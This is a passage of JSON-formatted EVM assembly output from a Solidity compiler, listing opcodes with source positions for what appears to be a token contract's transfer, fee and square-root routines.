											"begin": 2663,
											"end": 2678,
											"name": "MSTORE"
										},
										{
											"begin": 2663,
											"end": 2672,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 2663,
											"end": 2678,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 2663,
											"end": 2678,
											"name": "MSTORE"
										},
										{
											"begin": 2663,
											"end": 2678,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 2663,
											"end": 2678,
											"name": "DUP1"
										},
										{
											"begin": 2663,
											"end": 2678,
											"name": "DUP3"
										},
										{
											"begin": 2663,
											"end": 2678,
											"name": "KECCAK256"
										},
										{
											"begin": 2663,
											"end": 2707,
											"name": "SWAP4"
										},
										{
											"begin": 2663,
											"end": 2707,
											"name": "SWAP1"
										},
										{
											"begin": 2663,
											"end": 2707,
											"name": "SWAP4"
										},
										{
											"begin": 2663,
											"end": 2707,
											"name": "SSTORE"
										},
										{
											"begin": 2733,
											"end": 2746,
											"name": "SWAP1"
										},
										{
											"begin": 2733,
											"end": 2746,
											"name": "DUP5"
										},
										{
											"begin": 2733,
											"end": 2746,
											"name": "AND"
										},
										{
											"begin": 2733,
											"end": 2746,
											"name": "DUP2"
										},
										{
											"begin": 2733,
											"end": 2746,
											"name": "MSTORE"
										},
										{
											"begin": 2733,
											"end": 2746,
											"name": "KECCAK256"
										},
										{
											"begin": 2733,
											"end": 2746,
											"name": "SLOAD"
										},
										{
											"begin": 2733,
											"end": 2757,
											"name": "PUSH [tag]",
											"value": "357"
										},
										{
											"begin": 2733,
											"end": 2757,
											"name": "SWAP1"
										},
										{
											"begin": 2751,
											"end": 2756,
											"name": "DUP3"
										},
										{
											"begin": 2733,
											"end": 2757,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 2733,
											"end": 2750,
											"name": "PUSH [tag]",
											"value": "358"
										},
										{
											"begin": 2733,
											"end": 2757,
											"name": "AND"
										},
										{
											"begin": 2733,
											"end": 2757,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 2733,
											"end": 2757,
											"name": "tag",
											"value": "357"
										},
										{
											"begin": 2733,
											"end": 2757,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 2717,
											"end": 2730,
											"name": "DUP1"
										},
										{
											"begin": 2717,
											"end": 2730,
											"name": "DUP5"
										},
										{
											"begin": 2717,
											"end": 2730,
											"name": "AND"
										},
										{
											"begin": 2717,
											"end": 2730,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 2717,
											"end": 2730,
											"name": "DUP2"
										},
										{
											"begin": 2717,
											"end": 2730,
											"name": "DUP2"
										},
										{
											"begin": 2717,
											"end": 2730,
											"name": "MSTORE"
										},
										{
											"begin": 2717,
											"end": 2726,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 2717,
											"end": 2730,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 2717,
											"end": 2730,
											"name": "SWAP1"
										},
										{
											"begin": 2717,
											"end": 2730,
											"name": "DUP2"
										},
										{
											"begin": 2717,
											"end": 2730,
											"name": "MSTORE"
										},
										{
											"begin": 2717,
											"end": 2730,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 2717,
											"end": 2730,
											"name": "SWAP2"
										},
										{
											"begin": 2717,
											"end": 2730,
											"name": "DUP3"
										},
										{
											"begin": 2717,
											"end": 2730,
											"name": "SWAP1"
										},
										{
											"begin": 2717,
											"end": 2730,
											"name": "KECCAK256"
										},
										{
											"begin": 2717,
											"end": 2757,
											"name": "SWAP5"
										},
										{
											"begin": 2717,
											"end": 2757,
											"name": "SWAP1"
										},
										{
											"begin": 2717,
											"end": 2757,
											"name": "SWAP5"
										},
										{
											"begin": 2717,
											"end": 2757,
											"name": "SSTORE"
										},
										{
											"begin": 2772,
											"end": 2797,
											"name": "DUP1"
										},
										{
											"begin": 2772,
											"end": 2797,
											"name": "MLOAD"
										},
										{
											"begin": 2772,
											"end": 2797,
											"name": "DUP6"
										},
										{
											"begin": 2772,
											"end": 2797,
											"name": "DUP2"
										},
										{
											"begin": 2772,
											"end": 2797,
											"name": "MSTORE"
										},
										{
											"begin": 2772,
											"end": 2797,
											"name": "SWAP1"
										},
										{
											"begin": 2772,
											"end": 2797,
											"name": "MLOAD"
										},
										{
											"begin": 2717,
											"end": 2730,
											"name": "SWAP2"
										},
										{
											"begin": 2717,
											"end": 2730,
											"name": "SWAP4"
										},
										{
											"begin": 2772,
											"end": 2797,
											"name": "SWAP3"
										},
										{
											"begin": 2772,
											"end": 2797,
											"name": "DUP8"
										},
										{
											"begin": 2772,
											"end": 2797,
											"name": "AND"
										},
										{
											"begin": 2772,
											"end": 2797,
											"name": "SWAP3"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "DUP1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH data",
											"value": "ADA389E1FC24A8587C776340EFB91B36E675792AB631816100D55DF0B5CF3CBC"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "DUP4"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "CODECOPY"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "DUP2"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SWAP2"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "MSTORE"
										},
										{
											"begin": 2772,
											"end": 2797,
											"name": "SWAP3"
										},
										{
											"begin": 2772,
											"end": 2797,
											"name": "SWAP2"
										},
										{
											"begin": 2772,
											"end": 2797,
											"name": "DUP3"
										},
										{
											"begin": 2772,
											"end": 2797,
											"name": "SWAP1"
										},
										{
											"begin": 2772,
											"end": 2797,
											"name": "SUB"
										},
										{
											"begin": 2772,
											"end": 2797,
											"name": "ADD"
										},
										{
											"begin": 2772,
											"end": 2797,
											"name": "SWAP1"
										},
										{
											"begin": 2772,
											"end": 2797,
											"name": "LOG3"
										},
										{
											"begin": 2585,
											"end": 2804,
											"name": "POP"
										},
										{
											"begin": 2585,
											"end": 2804,
											"name": "POP"
										},
										{
											"begin": 2585,
											"end": 2804,
											"name": "POP"
										},
										{
											"begin": 2585,
											"end": 2804,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 4259,
											"end": 5152,
											"name": "tag",
											"value": "214"
										},
										{
											"begin": 4259,
											"end": 5152,
											"name": "JUMPDEST"
										},
										{
											"begin": 4354,
											"end": 4364,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 4376,
											"end": 4389,
											"name": "DUP1"
										},
										{
											"begin": 4401,
											"end": 4408,
											"name": "PUSH",
											"value": "7"
										},
										{
											"begin": 4401,
											"end": 4408,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 4401,
											"end": 4408,
											"name": "SWAP1"
										},
										{
											"begin": 4401,
											"end": 4408,
											"name": "SLOAD"
										},
										{
											"begin": 4401,
											"end": 4408,
											"name": "SWAP1"
										},
										{
											"begin": 4401,
											"end": 4408,
											"name": "PUSH",
											"value": "100"
										},
										{
											"begin": 4401,
											"end": 4408,
											"name": "EXP"
										},
										{
											"begin": 4401,
											"end": 4408,
											"name": "SWAP1"
										},
										{
											"begin": 4401,
											"end": 4408,
											"name": "DIV"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 4401,
											"end": 4408,
											"name": "AND"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 4392,
											"end": 4415,
											"name": "AND"
										},
										{
											"begin": 4392,
											"end": 4415,
											"name": "PUSH",
											"value": "17E7E58"
										},
										{
											"begin": 4392,
											"end": 4417,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 4392,
											"end": 4417,
											"name": "MLOAD"
										},
										{
											"begin": 4392,
											"end": 4417,
											"name": "DUP2"
										},
										{
											"begin": 4392,
											"end": 4417,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 4392,
											"end": 4417,
											"name": "AND"
										},
										{
											"begin": 4392,
											"end": 4417,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": 4392,
											"end": 4417,
											"name": "SHL"
										},
										{
											"begin": 4392,
											"end": 4417,
											"name": "DUP2"
										},
										{
											"begin": 4392,
											"end": 4417,
											"name": "MSTORE"
										},
										{
											"begin": 4392,
											"end": 4417,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 4392,
											"end": 4417,
											"name": "ADD"
										},
										{
											"begin": 4392,
											"end": 4417,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 4392,
											"end": 4417,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 4392,
											"end": 4417,
											"name": "MLOAD"
										},
										{
											"begin": 4392,
											"end": 4417,
											"name": "DUP1"
										},
										{
											"begin": 4392,
											"end": 4417,
											"name": "DUP4"
										},
										{
											"begin": 4392,
											"end": 4417,
											"name": "SUB"
										},
										{
											"begin": 4392,
											"end": 4417,
											"name": "DUP2"
										},
										{
											"begin": 4392,
											"end": 4417,
											"name": "DUP7"
										},
										{
											"begin": 4392,
											"end": 4417,
											"name": "DUP1"
										},
										{
											"begin": 4392,
											"end": 4417,
											"name": "EXTCODESIZE"
										},
										{
											"begin": 4392,
											"end": 4417,
											"name": "ISZERO"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "360"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "360"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 4392,
											"end": 4417,
											"name": "POP"
										},
										{
											"begin": 4392,
											"end": 4417,
											"name": "GAS"
										},
										{
											"begin": 4392,
											"end": 4417,
											"name": "STATICCALL"
										},
										{
											"begin": 4392,
											"end": 4417,
											"name": "ISZERO"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "361"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 45,
											"end": 61,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 42,
											"end": 43,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 39,
											"end": 40,
											"name": "DUP1"
										},
										{
											"begin": 24,
											"end": 62,
											"name": "RETURNDATACOPY"
										},
										{
											"begin": 77,
											"end": 93,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 74,
											"end": 75,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 67,
											"end": 94,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "361"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 4392,
											"end": 4417,
											"name": "POP"
										},
										{
											"begin": 4392,
											"end": 4417,
											"name": "POP"
										},
										{
											"begin": 4392,
											"end": 4417,
											"name": "POP"
										},
										{
											"begin": 4392,
											"end": 4417,
											"name": "POP"
										},
										{
											"begin": 4392,
											"end": 4417,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 4392,
											"end": 4417,
											"name": "MLOAD"
										},
										{
											"begin": 4392,
											"end": 4417,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "362"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "362"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 4392,
											"end": 4417,
											"name": "MLOAD"
										},
										{
											"begin": 4478,
											"end": 4483,
											"name": "PUSH",
											"value": "E"
										},
										{
											"begin": 4478,
											"end": 4483,
											"name": "SLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 4435,
											"end": 4454,
											"name": "DUP3"
										},
										{
											"begin": 4435,
											"end": 4454,
											"name": "AND"
										},
										{
											"begin": 4435,
											"end": 4454,
											"name": "ISZERO"
										},
										{
											"begin": 4435,
											"end": 4454,
											"name": "DUP1"
										},
										{
											"begin": 4435,
											"end": 4454,
											"name": "ISZERO"
										},
										{
											"begin": 4435,
											"end": 4454,
											"name": "SWAP5"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 4392,
											"end": 4417,
											"name": "SWAP2"
										},
										{
											"begin": 4392,
											"end": 4417,
											"name": "SWAP3"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 4478,
											"end": 4483,
											"name": "SWAP1"
										},
										{
											"begin": 4508,
											"end": 5146,
											"name": "PUSH [tag]",
											"value": "363"
										},
										{
											"begin": 4508,
											"end": 5146,
											"name": "JUMPI"
										},
										{
											"begin": 4537,
											"end": 4548,
											"name": "DUP1"
										},
										{
											"begin": 4537,
											"end": 4548,
											"name": "ISZERO"
										},
										{
											"begin": 4533,
											"end": 5079,
											"name": "PUSH [tag]",
											"value": "364"
										},
										{
											"begin": 4533,
											"end": 5079,
											"name": "JUMPI"
										},
										{
											"begin": 4568,
											"end": 4578,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 4581,
											"end": 4622,
											"name": "PUSH [tag]",
											"value": "365"
										},
										{
											"begin": 4591,
											"end": 4621,
											"name": "PUSH [tag]",
											"value": "218"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 4591,
											"end": 4606,
											"name": "DUP9"
										},
										{
											"begin": 4591,
											"end": 4606,
											"name": "DUP2"
										},
										{
											"begin": 4591,
											"end": 4606,
											"name": "AND"
										},
										{
											"begin": 4591,
											"end": 4606,
											"name": "SWAP1"
										},
										{
											"begin": 4591,
											"end": 4621,
											"name": "DUP9"
										},
										{
											"begin": 4591,
											"end": 4621,
											"name": "AND"
										},
										{
											"begin": 4591,
											"end": 4621,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 4591,
											"end": 4610,
											"name": "PUSH [tag]",
											"value": "175"
										},
										{
											"begin": 4591,
											"end": 4621,
											"name": "AND"
										},
										{
											"begin": 4591,
											"end": 4621,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 4581,
											"end": 4622,
											"name": "tag",
											"value": "365"
										},
										{
											"begin": 4581,
											"end": 4622,
											"name": "JUMPDEST"
										},
										{
											"begin": 4568,
											"end": 4622,
											"name": "SWAP1"
										},
										{
											"begin": 4568,
											"end": 4622,
											"name": "POP"
										},
										{
											"begin": 4640,
											"end": 4654,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 4657,
											"end": 4674,
											"name": "PUSH [tag]",
											"value": "367"
										},
										{
											"begin": 4667,
											"end": 4673,
											"name": "DUP4"
										},
										{
											"begin": 4657,
											"end": 4666,
											"name": "PUSH [tag]",
											"value": "219"
										},
										{
											"begin": 4657,
											"end": 4674,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 4657,
											"end": 4674,
											"name": "tag",
											"value": "367"
										},
										{
											"begin": 4657,
											"end": 4674,
											"name": "JUMPDEST"
										},
										{
											"begin": 4640,
											"end": 4674,
											"name": "SWAP1"
										},
										{
											"begin": 4640,
											"end": 4674,
											"name": "POP"
										},
										{
											"begin": 4704,
											"end": 4713,
											"name": "DUP1"
										},
										{
											"begin": 4696,
											"end": 4701,
											"name": "DUP3"
										},
										{
											"begin": 4696,
											"end": 4713,
											"name": "GT"
										},
										{
											"begin": 4692,
											"end": 5065,
											"name": "ISZERO"
										},
										{
											"begin": 4692,
											"end": 5065,
											"name": "PUSH [tag]",
											"value": "368"
										},
										{
											"begin": 4692,
											"end": 5065,
											"name": "JUMPI"
										},
										{
											"begin": 4737,
											"end": 4751,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 4754,
											"end": 4844,
											"name": "PUSH [tag]",
											"value": "369"
										},
										{
											"begin": 4821,
											"end": 4822,
											"name": "PUSH",
											"value": "8"
										},
										{
											"begin": 4754,
											"end": 4791,
											"name": "PUSH [tag]",
											"value": "182"
										},
										{
											"begin": 4770,
											"end": 4790,
											"name": "PUSH [tag]",
											"value": "371"
										},
										{
											"begin": 4770,
											"end": 4775,
											"name": "DUP7"
										},
										{
											"begin": 4780,
											"end": 4789,
											"name": "DUP7"
										},
										{
											"begin": 4770,
											"end": 4790,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 4770,
											"end": 4779,
											"name": "PUSH [tag]",
											"value": "177"
										},
										{
											"begin": 4770,
											"end": 4790,
											"name": "AND"
										},
										{
											"begin": 4770,
											"end": 4790,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 4770,
											"end": 4790,
											"name": "tag",
											"value": "371"
										},
										{
											"begin": 4770,
											"end": 4790,
											"name": "JUMPDEST"
										},
										{
											"begin": 4754,
											"end": 4765,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 4754,
											"end": 4765,
											"name": "SLOAD"
										},
										{
											"begin": 4754,
											"end": 4765,
											"name": "SWAP1"
										},
										{
											"begin": 4754,
											"end": 4791,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 4754,
											"end": 4769,
											"name": "PUSH [tag]",
											"value": "175"
										},
										{
											"begin": 4754,
											"end": 4791,
											"name": "AND"
										},
										{
											"begin": 4754,
											"end": 4791,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 4754,
											"end": 4844,
											"name": "tag",
											"value": "369"
										},
										{
											"begin": 4754,
											"end": 4844,
											"name": "JUMPDEST"
										},
										{
											"begin": 4737,
											"end": 4844,
											"name": "SWAP1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 4866,
											"end": 4882,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 4885,
											"end": 4920,
											"name": "PUSH [tag]",
											"value": "372"
										},
										{
											"begin": 4903,
											"end": 4919,
											"name": "PUSH [tag]",
											"value": "373"
										},
										{
											"begin": 4903,
											"end": 4912,
											"name": "DUP5"
										},
										{
											"begin": 4917,
											"end": 4918,
											"name": "PUSH",
											"value": "8"
										},
										{
											"begin": 4903,
											"end": 4919,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 4903,
											"end": 4916,
											"name": "PUSH [tag]",
											"value": "175"
										},
										{
											"begin": 4903,
											"end": 4919,
											"name": "AND"
										},
										{
											"begin": 4903,
											"end": 4919,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 4903,
											"end": 4919,
											"name": "tag",
											"value": "373"
										},
										{
											"begin": 4903,
											"end": 4919,
											"name": "JUMPDEST"
										},
										{
											"begin": 4885,
											"end": 4898,
											"name": "PUSH [tag]",
											"value": "374"
										},
										{
											"begin": 4885,
											"end": 4890,
											"name": "DUP7"
										},
										{
											"begin": 4895,
											"end": 4897,
											"name": "PUSH",
											"value": "11"
										},
										{
											"begin": 4885,
											"end": 4898,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 4885,
											"end": 4894,
											"name": "PUSH [tag]",
											"value": "175"
										},
										{
											"begin": 4885,
											"end": 4898,
											"name": "AND"
										},
										{
											"begin": 4885,
											"end": 4898,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 4885,
											"end": 4898,
											"name": "tag",
											"value": "374"
										},
										{
											"begin": 4885,
											"end": 4898,
											"name": "JUMPDEST"
										},
										{
											"begin": 4885,
											"end": 4902,
											"name": "SWAP1"
										},
										{
											"begin": 4885,
											"end": 4920,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 4885,
											"end": 4902,
											"name": "PUSH [tag]",
											"value": "358"
										},
										{
											"begin": 4885,
											"end": 4920,
											"name": "AND"
										},
										{
											"begin": 4885,
											"end": 4920,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 4885,
											"end": 4920,
											"name": "tag",
											"value": "372"
										},
										{
											"begin": 4885,
											"end": 4920,
											"name": "JUMPDEST"
										},
										{
											"begin": 4866,
											"end": 4920,
											"name": "SWAP1"
										},
										{
											"begin": 4866,
											"end": 4920,
											"name": "POP"
										},
										{
											"begin": 4942,
											"end": 4956,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 4971,
											"end": 4982,
											"name": "DUP2"
										},
										{
											"begin": 4959,
											"end": 4968,
											"name": "DUP4"
										},
										{
											"begin": 4959,
											"end": 4982,
											"name": "DUP2"
										},
										{
											"begin": 4959,
											"end": 4982,
											"name": "PUSH [tag]",
											"value": "375"
										},
										{
											"begin": 4959,
											"end": 4982,
											"name": "JUMPI"
										},
										{
											"begin": 4959,
											"end": 4982,
											"name": "INVALID"
										},
										{
											"begin": 4959,
											"end": 4982,
											"name": "tag",
											"value": "375"
										},
										{
											"begin": 4959,
											"end": 4982,
											"name": "JUMPDEST"
										},
										{
											"begin": 4959,
											"end": 4982,
											"name": "DIV"
										},
										{
											"begin": 4959,
											"end": 4982,
											"name": "SWAP1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 5008,
											"end": 5021,
											"name": "DUP1"
										},
										{
											"begin": 5008,
											"end": 5021,
											"name": "ISZERO"
										},
										{
											"begin": 5004,
											"end": 5046,
											"name": "PUSH [tag]",
											"value": "377"
										},
										{
											"begin": 5004,
											"end": 5046,
											"name": "JUMPI"
										},
										{
											"begin": 5023,
											"end": 5046,
											"name": "PUSH [tag]",
											"value": "377"
										},
										{
											"begin": 5029,
											"end": 5034,
											"name": "DUP8"
										},
										{
											"begin": 5036,
											"end": 5045,
											"name": "DUP3"
										},
										{
											"begin": 5023,
											"end": 5028,
											"name": "PUSH [tag]",
											"value": "221"
										},
										{
											"begin": 5023,
											"end": 5046,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 5023,
											"end": 5046,
											"name": "tag",
											"value": "377"
										},
										{
											"begin": 5023,
											"end": 5046,
											"name": "JUMPDEST"
										},
										{
											"begin": 4692,
											"end": 5065,
											"name": "POP"
										},
										{
											"begin": 4692,
											"end": 5065,
											"name": "POP"
										},
										{
											"begin": 4692,
											"end": 5065,
											"name": "POP"
										},
										{
											"begin": 4692,
											"end": 5065,
											"name": "tag",
											"value": "368"
										},
										{
											"begin": 4692,
											"end": 5065,
											"name": "JUMPDEST"
										},
										{
											"begin": 4533,
											"end": 5079,
											"name": "POP"
										},
										{
											"begin": 4533,
											"end": 5079,
											"name": "POP"
										},
										{
											"begin": 4533,
											"end": 5079,
											"name": "tag",
											"value": "364"
										},
										{
											"begin": 4533,
											"end": 5079,
											"name": "JUMPDEST"
										},
										{
											"begin": 4508,
											"end": 5146,
											"name": "PUSH [tag]",
											"value": "379"
										},
										{
											"begin": 4508,
											"end": 5146,
											"name": "JUMP"
										},
										{
											"begin": 4508,
											"end": 5146,
											"name": "tag",
											"value": "363"
										},
										{
											"begin": 4508,
											"end": 5146,
											"name": "JUMPDEST"
										},
										{
											"begin": 5099,
											"end": 5110,
											"name": "DUP1"
										},
										{
											"begin": 5099,
											"end": 5110,
											"name": "ISZERO"
										},
										{
											"begin": 5095,
											"end": 5146,
											"name": "PUSH [tag]",
											"value": "379"
										},
										{
											"begin": 5095,
											"end": 5146,
											"name": "JUMPI"
										},
										{
											"begin": 5134,
											"end": 5135,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 5126,
											"end": 5131,
											"name": "PUSH",
											"value": "E"
										},
										{
											"begin": 5126,
											"end": 5135,
											"name": "SSTORE"
										},
										{
											"begin": 5095,
											"end": 5146,
											"name": "tag",
											"value": "379"
										},
										{
											"begin": 5095,
											"end": 5146,
											"name": "JUMPDEST"
										},
										{
											"begin": 4259,
											"end": 5152,
											"name": "POP"
										},
										{
											"begin": 4259,
											"end": 5152,
											"name": "POP"
										},
										{
											"begin": 4259,
											"end": 5152,
											"name": "SWAP3"
										},
										{
											"begin": 4259,
											"end": 5152,
											"name": "SWAP2"
										},
										{
											"begin": 4259,
											"end": 5152,
											"name": "POP"
										},
										{
											"begin": 4259,
											"end": 5152,
											"name": "POP"
										},
										{
											"begin": 4259,
											"end": 5152,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 352,
											"end": 653,
											"name": "tag",
											"value": "219"
										},
										{
											"begin": 352,
											"end": 653,
											"name": "JUMPDEST"
										},
										{
											"begin": 400,
											"end": 409,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 429,
											"end": 430,
											"name": "PUSH",
											"value": "3"
										},
										{
											"begin": 425,
											"end": 426,
											"name": "DUP3"
										},
										{
											"begin": 425,
											"end": 430,
											"name": "GT"
										},
										{
											"begin": 421,
											"end": 647,
											"name": "ISZERO"
										},
										{
											"begin": 421,
											"end": 647,
											"name": "PUSH [tag]",
											"value": "381"
										},
										{
											"begin": 421,
											"end": 647,
											"name": "JUMPI"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 450,
											"end": 451,
											"name": "DUP1"
										},
										{
											"begin": 485,
											"end": 486,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 481,
											"end": 482,
											"name": "PUSH",
											"value": "2"
										},
										{
											"begin": 477,
											"end": 482,
											"name": "DUP3"
										},
										{
											"begin": 477,
											"end": 482,
											"name": "DIV"
										},
										{
											"begin": 477,
											"end": 486,
											"name": "ADD"
										},
										{
											"begin": 500,
											"end": 589,
											"name": "tag",
											"value": "383"
										},
										{
											"begin": 500,
											"end": 589,
											"name": "JUMPDEST"
										},
										{
											"begin": 511,
											"end": 512,
											"name": "DUP2"
										},
										{
											"begin": 507,
											"end": 508,
											"name": "DUP2"
										},
										{
											"begin": 507,
											"end": 512,
											"name": "LT"
										},
										{
											"begin": 500,
											"end": 589,
											"name": "ISZERO"
										},
										{
											"begin": 500,
											"end": 589,
											"name": "PUSH [tag]",
											"value": "384"
										},
										{
											"begin": 500,
											"end": 589,
											"name": "JUMPI"
										},
										{
											"begin": 536,
											"end": 537,
											"name": "DUP1"
										},
										{
											"begin": 532,
											"end": 537,
											"name": "SWAP2"
										},
										{
											"begin": 532,
											"end": 537,
											"name": "POP"
										},
										{
											"begin": 573,
											"end": 574,
											"name": "PUSH",
											"value": "2"
										},
										{
											"begin": 568,
											"end": 569,
											"name": "DUP2"
										},
										{
											"begin": 564,
											"end": 565,
											"name": "DUP3"
										},
										{
											"begin": 560,
											"end": 561,
											"name": "DUP6"
										},
										{
											"begin": 560,
											"end": 565,
											"name": "DUP2"
										},
										{
											"begin": 560,
											"end": 565,
											"name": "PUSH [tag]",
											"value": "385"
										},
										{
											"begin": 560,
											"end": 565,
											"name": "JUMPI"
										},
										{
											"begin": 560,
											"end": 565,
											"name": "INVALID"
										},
										{
											"begin": 560,
											"end": 565,
											"name": "tag",
